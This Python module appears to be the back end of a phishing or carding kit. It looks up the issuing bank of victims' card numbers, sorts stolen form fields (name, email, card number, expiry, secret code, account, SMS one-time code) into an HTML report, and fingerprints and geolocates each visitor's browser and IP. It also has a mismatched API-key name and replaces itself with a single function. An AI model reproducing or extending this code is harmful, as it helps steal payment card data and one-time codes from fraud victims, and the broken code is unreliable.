from user_agents import parse
from requests import get
from config import IP_TO_EARTH_KEY
import sys


def getCardInfo(number):
    data = {}
    try:
        reponce = get('https://lookup.binlist.net/' +
                      number[:8], headers={'Accept-Version': '3'})
        reponce = reponce.json()
        data['scheme'] = reponce['scheme']
        data['type'] = reponce['type']
        data['prepaid'] = reponce['prepaid']
        data['brand'] = reponce['brand']
        data['bank'] = reponce['bank']['name']
    except Exception:
        pass
    return data


def bodySort(s):
    if s in ('smiya', 'zyada', 'barid', 'nmra'):
        if s == 'smiya':
            return 0
        elif s == 'barid':
            return 1
        elif s == 'zyada':
            return 2
        elif s == 'nmra':
            return 3
        else:
            return 4
    if s in ('bita9a', 'tarikh', 'sicret', 'compte', 'q1', 'q2'):
        if s == 'bita9a':
            return 5
        elif s == 'tarikh':
            return 6
        elif s == 'sicret':
            return 7
        elif s == 'compte':
            return 8
        else:
            return 4
    if s in ('sms'):
        if s == 'sms':
            return 9
        else:
            return 10
    return 11


def getBody(data):
    body = ""
    for key in sorted(data.keys(), key=bodySort):
        body = body + "<h4>{0} : {1}</h4>".format(key, data[key])
    return body


def get_ip_info(ip):
    url = 'https://iptoearth.expeditedaddons.com/?api_key={key}&ip={ip}'
    info = dict()
    try:
        reponce = get(url.format(ip=ip, key=IPTOEARTH_API_KEY))
        if reponce.ok is True and reponce.json()['valid'] is True:
            reponce = reponce.json()
            info['country'] = reponce['country']
            info['city'] = reponce['city']
            info['region'] = reponce['region']
            info['location'] = [reponce['longitude'], reponce['latitude']]
    except Exception:
        pass
    return info


def get_info(request):
    ip = request.access_route[0]
    user_agent = request.headers.get('User-Agent')
    user_agent = parse(user_agent)
    visite = {}
    visite['browser'] = {"family": user_agent.browser.family,
                         "version": user_agent.browser.version_string}
    visite['device'] = {"family": user_agent.device.family,
                        "brand": user_agent.device.brand,
                        "model": user_agent.device.model}
    visite['os'] = {"family": user_agent.os.family,
                    "version": user_agent.os.version_string}
    visite['ip'] = ip
    if user_agent.is_pc:
        visite['platform'] = "Pc"
    elif user_agent.is_mobile:
        visite['platform'] = "Mobile"
    elif user_agent.is_tablet:
        visite['platform'] = "Tablet"
    elif user_agent.is_bot:
        visite['platform'] = "Bot"
    else:
        visite['platform'] = "Other"
    visite.update(get_ip_info(ip))
    return visite

sys.modules[__name__] = get_info